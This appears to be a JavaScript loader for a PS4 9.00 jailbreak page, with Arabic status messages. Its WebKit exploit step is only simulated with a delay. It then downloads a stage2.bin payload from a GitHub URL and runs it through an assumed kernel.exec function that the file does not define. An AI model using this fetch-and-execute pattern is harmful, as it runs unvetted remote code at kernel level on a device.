async function run_hax() {
  const progress = (msg) => document.getElementById('status').textContent = msg;

  try {
    progress('🚀 جاري تشغيل WebKit Exploit...');
    await new Promise(resolve => setTimeout(resolve, 3000)); // تحاكي وقت تشغيل الاستغلال

    progress('⬇️ جاري تحميل البايلود من GitHub...');

    const payloadUrl = 'https://github.com/SALMXD999/Ps4-9.00/raw/refs/heads/main/stage2.bin';
    const response = await fetch(payloadUrl);

    if (!response.ok) throw new Error('❌ فشل تحميل stage2.bin من GitHub');

    const payloadBuffer = await response.arrayBuffer();

    progress('💥 جاري تنفيذ البايلود...');

    if (typeof kernel === 'undefined' || typeof kernel.exec !== 'function') {
      throw new Error('❌ دالة kernel.exec غير موجودة.');
    }

    await kernel.exec(payloadBuffer);

    progress('✅ تم تنفيذ البايلود بنجاح من GitHub!');

  } catch (err) {
    console.error(err);
    progress('❌ خطأ: ' + err.message);
  }
}

